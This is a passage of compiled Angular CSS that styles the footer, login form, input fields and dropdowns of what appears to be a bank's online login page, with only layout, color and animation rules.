        display: block
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider[_ngcontent-qmv-c26] {
        margin: 0 6px;
        align-self: flex-end
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.tablet[_ngcontent-qmv-c26] {
        display: block
      }

      .avv-footer-copyright.opened[_ngcontent-qmv-c26] {
        height: 61px !important
      }

      .avv-footer-copyright.opened.marketplace[_ngcontent-qmv-c26],
      .avv-footer-copyright.opened.app[_ngcontent-qmv-c26] {
        height: 45px
      }

      .avv-footer-copyright[_ngcontent-qmv-c26] div.info[_ngcontent-qmv-c26] {
        display: none !important
      }
    }

    @media (min-width: 768px) {
      .avv-footer-container.login[_ngcontent-qmv-c26] {
        padding: 0 16px 16px
      }

      .avv-footer-container.general[_ngcontent-qmv-c26],
      .avv-footer-container.pse[_ngcontent-qmv-c26],
      .avv-footer-container.user-does-not-exist[_ngcontent-qmv-c26],
      .avv-footer-container.marketplace[_ngcontent-qmv-c26],
      .avv-footer-container.app[_ngcontent-qmv-c26] {
        padding: 24px 24px 16px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] {
        font-size: 12px;
        line-height: 1.5;
        margin-bottom: 0
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] {
        display: block
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.login[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.user-does-not-exist[_ngcontent-qmv-c26] {
        display: flex;
        flex-direction: column-reverse;
        align-items: flex-start;
        margin-right: 20px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-super.login[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-super.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-super.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-super.user-does-not-exist[_ngcontent-qmv-c26] {
        display: block !important;
        width: 122px;
        height: auto;
        margin: 21px 0 0
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-aval.login[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-aval.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-aval.user-does-not-exist[_ngcontent-qmv-c26] {
        display: block !important;
        width: 122px;
        height: 28px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo[_ngcontent-qmv-c26] img.logo-aval.pse[_ngcontent-qmv-c26] {
        display: block !important;
        width: 97px;
        height: 28px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.user-does-not-exist[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.marketplace[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.app[_ngcontent-qmv-c26] {
        font-weight: 700 !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider[_ngcontent-qmv-c26] {
        margin: 0 7px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] p.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] p.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] p.user-does-not-exist[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] p.marketplace[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] p.app[_ngcontent-qmv-c26] {
        font-weight: 700 !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] p[_ngcontent-qmv-c26]:last-child {
        font-weight: 400 !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] img.logo-aval.login[_ngcontent-qmv-c26] {
        display: block !important;
        width: 91px;
        height: 32px;
        margin-left: 30px
      }

      .avv-footer-copyright[_ngcontent-qmv-c26] {
        display: none
      }
    }

    @media (min-width: 992px) {

      .avv-footer-container.general[_ngcontent-qmv-c26],
      .avv-footer-container.login[_ngcontent-qmv-c26] {
        display: flex;
        padding: 24px 0 16px 42px;
        background-color: transparent
      }

      .avv-footer-container.pse[_ngcontent-qmv-c26] {
        display: flex;
        width: 50vw;
        padding: 24px 0 16px 42px;
        background-color: transparent
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] {
        font-size: 9px;
        line-height: 1.45
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description.app[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description.marketplace[_ngcontent-qmv-c26] {
        font-size: 12px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description.user-does-not-exist[_ngcontent-qmv-c26] {
        justify-content: center
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.user-does-not-exist[_ngcontent-qmv-c26] {
        margin: 0
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.user-does-not-exist[_ngcontent-qmv-c26] img.logo-aval[_ngcontent-qmv-c26] {
        position: absolute;
        left: 16px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.user-does-not-exist[_ngcontent-qmv-c26] img.logo-super[_ngcontent-qmv-c26] {
        position: absolute;
        right: 16px;
        margin: 0
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.login[_ngcontent-qmv-c26] {
        height: 100%;
        margin-right: 16px;
        align-items: center;
        flex-direction: initial
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.general[_ngcontent-qmv-c26] img.logo-super[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.login[_ngcontent-qmv-c26] img.logo-super[_ngcontent-qmv-c26] {
        display: none !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.general[_ngcontent-qmv-c26] img.logo-aval[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.login[_ngcontent-qmv-c26] img.logo-aval[_ngcontent-qmv-c26] {
        width: 122px;
        display: initial !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.general[_ngcontent-qmv-c26] img.logo-super-desktop[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.login[_ngcontent-qmv-c26] img.logo-super-desktop[_ngcontent-qmv-c26] {
        display: block !important;
        position: absolute;
        bottom: 130px;
        height: 118px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.general[_ngcontent-qmv-c26] img.logo-aval-desktop[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.login[_ngcontent-qmv-c26] img.logo-aval-desktop[_ngcontent-qmv-c26] {
        display: block !important;
        position: absolute;
        top: -16px;
        left: 42px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.pse[_ngcontent-qmv-c26] {
        margin-right: 0
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.pse[_ngcontent-qmv-c26] img.logo-super[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.pse[_ngcontent-qmv-c26] img.logo-aval[_ngcontent-qmv-c26] {
        display: none !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.pse[_ngcontent-qmv-c26] img.logo-super-desktop[_ngcontent-qmv-c26] {
        display: block !important;
        position: absolute;
        bottom: 20px;
        left: 1rem;
        height: 118px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-logo.pse[_ngcontent-qmv-c26] img.logo-aval-desktop[_ngcontent-qmv-c26] {
        display: block !important;
        position: absolute;
        top: -16px;
        left: 42px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info.login[_ngcontent-qmv-c26] {
        padding: 0;
        width: auto
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info.user-does-not-exist[_ngcontent-qmv-c26] {
        width: 600px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] img.logo-aval.login[_ngcontent-qmv-c26] {
        display: none !important
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.login[_ngcontent-qmv-c26] {
        color: #252b31
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .text[_ngcontent-qmv-c26] p.pse[_ngcontent-qmv-c26] {
        color: #fff
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider[_ngcontent-qmv-c26] {
        margin: 0 6px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.login[_ngcontent-qmv-c26] {
        align-self: center;
        border-left: 1px solid #252B31
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.pse[_ngcontent-qmv-c26] {
        align-self: center;
        border-left: 1px solid #fff
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-line[_ngcontent-qmv-c26] p.login[_ngcontent-qmv-c26] {
        text-align: left;
        font-size: 12px;
        color: #252b31;
        line-height: 1.5
      }
    }

    @media (min-width: 1024px) {

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.login[_ngcontent-qmv-c26] {
        margin: 0 6px
      }
    }

    @media (min-width: 1200px) {

      .avv-footer-container.marketplace[_ngcontent-qmv-c26],
      .avv-footer-container.app[_ngcontent-qmv-c26] {
        padding: 1rem
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] {
        font-size: 11px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description.app[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description.marketplace[_ngcontent-qmv-c26] {
        font-size: 12px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.marketplace[_ngcontent-qmv-c26] {
        margin: 0 16px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.app[_ngcontent-qmv-c26] {
        margin: 0 6px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.login[_ngcontent-qmv-c26] {
        margin: 0 8px
      }
    }

    @media (min-width: 1400px) {
      .avv-footer-container[_ngcontent-qmv-c26] .description[_ngcontent-qmv-c26] {
        font-size: 12px
      }

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.login[_ngcontent-qmv-c26] {
        margin: 0 14px
      }
    }

    @media (min-width: 1600px) {

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.login[_ngcontent-qmv-c26] {
        margin: 0 20px
      }
    }

    @media (min-width: 2000px) {

      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.general[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.pse[_ngcontent-qmv-c26],
      .avv-footer-container[_ngcontent-qmv-c26] .description-info-phones[_ngcontent-qmv-c26] .divider.login[_ngcontent-qmv-c26] {
        margin: 0 32px
      }
    }

    .divider-line[_ngcontent-qmv-c26] {
      background-color: #9da6af;
      position: relative
    }

    .divider-line.login[_ngcontent-qmv-c26] {
      margin: 0 16px
    }

    @media (min-width: 768px) {
      .divider-line[_ngcontent-qmv-c26] {
        display: none
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c51_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c51_spin {
      to {
        transform: rotate(360deg)
      }
    }

    div.login-container[_ngcontent-qmv-c51] {
      display: flex;
      flex-direction: column;
      justify-content: center;
      margin: 0 auto;
      position: relative
    }

    div.login-container[_ngcontent-qmv-c51] div.toast-container.toast-top-center {
      top: -76px;
      left: 0;
      width: 100%;
      padding: 0
    }

    div.login-container[_ngcontent-qmv-c51] .divider[_ngcontent-qmv-c51] {
      background-color: #dbe2e8;
      max-width: 512px;
      position: relative;
      margin: 0
    }

    div.login-container[_ngcontent-qmv-c51] .register[_ngcontent-qmv-c51] {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      position: relative;
      margin: 2rem 0 0;
      color: #252b31
    }

    div.login-container[_ngcontent-qmv-c51] .register[_ngcontent-qmv-c51] a[_ngcontent-qmv-c51] {
      display: inline-block;
      color: #0048db;
      transition: .3s;
      font-size: 14px;
      line-height: 1.71;
      cursor: pointer;
      text-decoration: underline
    }

    div.login-container[_ngcontent-qmv-c51] .register[_ngcontent-qmv-c51] p[_ngcontent-qmv-c51] {
      margin: 0 0 5px;
      padding: 0
    }

    @media (min-width: 768px) {
      div.login-container[_ngcontent-qmv-c51] .register[_ngcontent-qmv-c51] {
        flex-direction: row
      }

      div.login-container[_ngcontent-qmv-c51] .register[_ngcontent-qmv-c51] p[_ngcontent-qmv-c51] {
        margin: 0 8px 0 0
      }
    }

    div.login-container[_ngcontent-qmv-c51] .forgot-password[_ngcontent-qmv-c51] {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      position: relative;
      margin-top: -24px;
      margin-bottom: 32px
    }

    div.login-container[_ngcontent-qmv-c51] .forgot-password[_ngcontent-qmv-c51] a[_ngcontent-qmv-c51] {
      display: inline-block;
      color: #0048db;
      transition: .3s;
      font-size: 12px;
      line-height: 2;
      cursor: pointer;
      text-decoration: underline
    }

    div.login-container[_ngcontent-qmv-c51] .forgot-password[_ngcontent-qmv-c51] .icon[_ngcontent-qmv-c51] {
      font-size: 16px;
      color: #0048db;
      margin-left: 8px
    }

    div.login-container[_ngcontent-qmv-c51] .login-form[_ngcontent-qmv-c51] .login-btn[_ngcontent-qmv-c51] {
      z-index: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      position: relative;
      margin-bottom: 2rem
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input avv-validation-messages .validation-message,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input avv-validation-messages .validation-message {
      color: #a00104;
      text-align: left
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label input,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label input {
      border: 1px solid #ACBAC9 !important;
      background-color: #fff !important;
      color: #414a53 !important
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label input:not(:placeholder-shown)+.label,
    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label input:focus+.label,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label input:not(:placeholder-shown)+.label,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label input:focus+.label {
      color: #0048db !important
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label input.ng-touched.ng-invalid+.label {
      color: #a00104 !important
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border {
      background: #A00104 !important
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border+.alert-icon,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border+.alert-icon {
      color: #a00104 !important
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border+.alert-icon+.bavv-form-icon,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border+.alert-icon+.bavv-form-icon {
      color: #a00104 !important
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label div.item-selected,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label div.item-selected {
      position: absolute;
      top: 25px;
      left: 16px;
      text-align: left;
      cursor: pointer
    }

    @media (max-width: 390px) {

      div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label div.item-selected,
      div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label div.item-selected {
        width: 240px;
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden
      }
    }

    div.login-container[_ngcontent-qmv-c51] bavv-dropdown.login-dropdown div.bavv-form-input label span,
    div.login-container[_ngcontent-qmv-c51] bavv-input.login-input div.bavv-form-input label span {
      color: #77899a !important
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c38_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c38_spin {
      to {
        transform: rotate(360deg)
      }
    }

    @keyframes _ngcontent-qmv-c38_spinner-border {
      to {
        transform: rotate(360deg)
      }
    }

    .spinner-border[_ngcontent-qmv-c38],
    .bavv-form-input.loading[_ngcontent-qmv-c38]:after {
      display: inline-block;
      width: 40px;
      height: 40px;
      vertical-align: text-bottom;
      border: 2px solid #ACBAC9;
      border-right-color: transparent;
      border-radius: 50%;
      animation: _ngcontent-qmv-c38_spinner-border .75s linear infinite
    }

    .bavv-form-input[_ngcontent-qmv-c38] {
      position: relative;
      font-size: 16px;
      padding: 0 0 32px
    }

    .bavv-form-input[_ngcontent-qmv-c38] avv-validation-messages .validation-message {
      color: #fff;
      margin-top: 3px
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] {
      position: relative;
      margin: auto;
      display: flex;
      width: 100%;
      height: 3.5rem;
      -webkit-user-select: none;
      user-select: none;
      border-radius: 4px;
      border: 1px solid rgba(241, 243, 246, .4)
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .label[_ngcontent-qmv-c38] {
      position: absolute;
      top: 1.125rem;
      left: 1rem;
      font-size: 1rem;
      overflow: hidden;
      color: #77899a;
      transform-origin: 0 0;
      transition: transform .2s ease
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .bavv-form-border[_ngcontent-qmv-c38] {
      position: absolute;
      bottom: -1px;
      left: 0;
      height: 2px;
      border-radius: 0 0 4px 4px;
      width: 100%;
      background: #0048DB;
      transform: scaleX(0);
      transform-origin: 0 0;
      transition: all .15s ease
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .bavv-form-icon[_ngcontent-qmv-c38],
    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .alert-icon[_ngcontent-qmv-c38] {
      font-size: 1.5rem;
      top: 14px;
      right: 16px;
      margin: 0;
      padding: 0;
      position: absolute;
      color: #77899a;
      opacity: 0;
      visibility: hidden;
      transition: .15s
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[type=number][_ngcontent-qmv-c38]::-webkit-outer-spin-button,
    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[type=number][_ngcontent-qmv-c38]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[type=number][_ngcontent-qmv-c38] {
      -moz-appearance: textfield
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] span[_ngcontent-qmv-c38] {
      color: #2c2c33 !important
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38] {
      -webkit-appearance: none;
      width: 100%;
      border: 0;
      font-family: inherit;
      padding: 26px 48px 6px 16px;
      height: 3.375rem;
      font-size: 1rem;
      line-height: 1.5;
      background: none;
      border-radius: 4px;
      transition: all .15s ease;
      background-color: #fff !important;
      color: #2c2c33 !important;
      cursor: pointer
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input.ng-touched.ng-invalid[_ngcontent-qmv-c38]+.label[_ngcontent-qmv-c38] {
      color: #a00104;
      transform: translateY(-12px) scale(.75)
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input.ng-touched.ng-invalid[_ngcontent-qmv-c38]+.label[_ngcontent-qmv-c38]+.bavv-form-border[_ngcontent-qmv-c38] {
      transform: scaleX(1);
      background: #A00104
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input.ng-touched.ng-invalid[_ngcontent-qmv-c38]+.label[_ngcontent-qmv-c38]+.bavv-form-border[_ngcontent-qmv-c38]+.alert-icon[_ngcontent-qmv-c38] {
      color: #a00104;
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input.ng-touched.ng-invalid[_ngcontent-qmv-c38]+.label[_ngcontent-qmv-c38]+.bavv-form-border[_ngcontent-qmv-c38]+.alert-icon[_ngcontent-qmv-c38]+.bavv-form-icon[_ngcontent-qmv-c38] {
      color: #a00104;
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:hover {
      background: #F1F3F6
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:not(:placeholder-shown)+.label[_ngcontent-qmv-c38] {
      color: #0048db;
      transform: translateY(-12px) scale(.75)
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:not(:placeholder-shown)+.label[_ngcontent-qmv-c38]+.bavv-form-border[_ngcontent-qmv-c38]+.bavv-form-icon[_ngcontent-qmv-c38] {
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:focus {
      background: none;
      outline: none
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:focus+.label[_ngcontent-qmv-c38] {
      color: #0048db;
      transform: translateY(-12px) scale(.75)
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:focus+.label[_ngcontent-qmv-c38]+.bavv-form-border[_ngcontent-qmv-c38] {
      transform: scaleX(1)
    }

    .bavv-form-input[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:focus+.label[_ngcontent-qmv-c38]+.bavv-form-border[_ngcontent-qmv-c38]+.bavv-form-icon[_ngcontent-qmv-c38] {
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] {
      z-index: 0
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38]:focus {
      outline: none;
      cursor: pointer
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] .bavv-form-icon[_ngcontent-qmv-c38] {
      position: absolute;
      right: 0;
      top: 10px;
      font-size: 16px;
      transition: .2s
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .bavv-form-icon[_ngcontent-qmv-c38] {
      opacity: 1;
      visibility: visible;
      cursor: pointer
    }

    .bavv-form-input.dropdown.is_open[_ngcontent-qmv-c38] {
      z-index: 1
    }

    .bavv-form-input.dropdown.is_open[_ngcontent-qmv-c38] .bavv-form-icon[_ngcontent-qmv-c38] {
      transform: rotate(180deg)
    }

    .bavv-form-input.dropdown.is_open[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] {
      border-radius: 4px 4px 0 0
    }

    .bavv-form-input.dropdown.is_template[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38] {
      color: #fff
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38] {
      list-style: none;
      border-radius: 0 0 4px 4px;
      text-align: left;
      padding: 0;
      box-shadow: 0 5px 10px #acbac9;
      position: absolute;
      width: 100%;
      top: 55px;
      background-color: #fff;
      z-index: 1;
      max-height: 284px;
      overflow-y: auto
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38]>li[_ngcontent-qmv-c38] {
      min-height: 3.5rem;
      color: #414a53;
      border-bottom: 1px solid #ACBAC9
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38]>li[_ngcontent-qmv-c38]:last-child {
      border-bottom: none
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38]>li.active[_ngcontent-qmv-c38] {
      background-color: #dbe2e8 !important
    }

    .bavv-form-input.dropdown[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38]>li[_ngcontent-qmv-c38]>span[_ngcontent-qmv-c38] {
      font-size: 16px;
      padding: 16px 24px 8px;
      color: #414a53;
      display: inline-block;
      width: 100%
    }

    .bavv-form-input.loading[_ngcontent-qmv-c38] {
      cursor: inherit
    }

    .bavv-form-input.loading[_ngcontent-qmv-c38]:after {
      content: "";
      width: 20px;
      height: 20px;
      border-width: 2px;
      position: absolute;
      right: 16px;
      top: 16px;
      color: #acbac9
    }

    .bavv-form-input.loading[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] {
      color: #acbac9 !important
    }

    .bavv-form-input.loading[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:focus+span[_ngcontent-qmv-c38] {
      color: #acbac9;
      transform: inherit
    }

    .bavv-form-input.loading[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38]:focus+span[_ngcontent-qmv-c38]+.bavv-form-border[_ngcontent-qmv-c38] {
      display: none
    }

